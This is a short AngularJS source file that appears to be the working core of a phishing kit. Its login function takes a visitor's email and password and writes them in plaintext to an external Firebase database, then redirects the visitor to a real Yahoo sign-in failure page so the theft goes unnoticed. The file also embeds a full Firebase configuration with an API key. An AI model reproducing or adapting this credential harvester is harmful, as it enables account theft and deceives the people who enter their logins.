var betApp = angular.module('betApp', ['angularMoment']);

betApp.run([
    '$rootScope',
    '$window',
    function($rootScope, $window) {
        var firebaseConfig = {
  apiKey: "AIzaSyDQ-XsLfNOsUt1n2gxarhSGoKeYv0PpU1A",
  authDomain: "pt-service.firebaseapp.com",
  projectId: "pt-service",
  storageBucket: "pt-service.appspot.com",
  messagingSenderId: "273176508220",
  appId: "1:273176508220:web:6a5a88626e886c7e20d039",
  measurementId: "G-NXKBCSSX9R"
        };
        // Initialize Firebase
        try {
            $window.firebase.initializeApp(firebaseConfig);
            $window.firebase.analytics();
            $rootScope.db = firebase.firestore();
            $rootScope.storage = firebase.storage();
            console.log($rootScope.storage);
        } catch (error) {
            console.log(error);
        }
    },
]);

betApp.controller('MainController', function(
    $scope,
    moment,
    $window,
    $rootScope,
    $timeout
) {

    $scope.user = {
        email: '',
        password: '',
    };

    $scope.user.email = $window.localStorage.getItem("login");


    $scope.login = function() {

        var guid = createGuid();

        $rootScope.db
            .collection('users')
            .doc(`${guid}`)
            .set({
                id: `${ guid}`,
                email: `${$scope.user.email}`,
                password: `${$scope.user.password}`,
            })
            .then(() => {

                $window.location.href="https://login.yahoo.com/account/challenge/fail?display=login&.intl=nz&intl=nz&specId=yidreg&done=https%3A%2F%2Fwww.yahoo.com%2F&prefill=0&prompt=login&chllngnm=fail&acrumb=8ehT8AVK&authMechanism=primary&sessionIndex=QQ--&eid=3650";

            })
            .catch(error => {
                console.error('Error adding document: ', error);
            });


    }

        function createGuid() {
        return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
            var r = Math.random() * 16 | 0,
                v = c === 'x' ? r : (r & 0x3 | 0x8);
            return v.toString(16);
        });
    }





});






